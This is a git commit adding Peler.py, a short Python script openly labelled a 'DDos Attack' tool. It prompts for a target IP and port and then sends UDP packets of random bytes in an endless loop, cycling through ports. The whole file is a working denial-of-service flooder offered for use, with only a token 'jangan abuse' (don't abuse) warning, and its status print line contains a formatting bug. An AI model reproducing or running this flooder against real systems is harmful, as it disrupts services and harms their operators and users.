3a3d8706a874d51cfb9e91378c8dd4d54b992971
Cryspot <94024627+Cryspot@users.noreply.github.com>
2021-11-15 05:17:10 +0700

    Create Peler.py

---
+++ Peler.py
@@ -0,0 +1,30 @@
+import sys,os,time,socket,random
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDos Attack")
+print("""\u001b[31m
+>> Welcome
+>>>>> jangan abuse
+>>>>>>>>> Tools by RedX""")
+
+ip = str(input("Ip : "))
+port = int(input("Port :"))
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print("Start Sent all Pakets to Server")
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print("Start Sent %s Pakets To %s Port socket:%")(sent,ip,port)
+     if port == 65534:
+       port = 1
+     
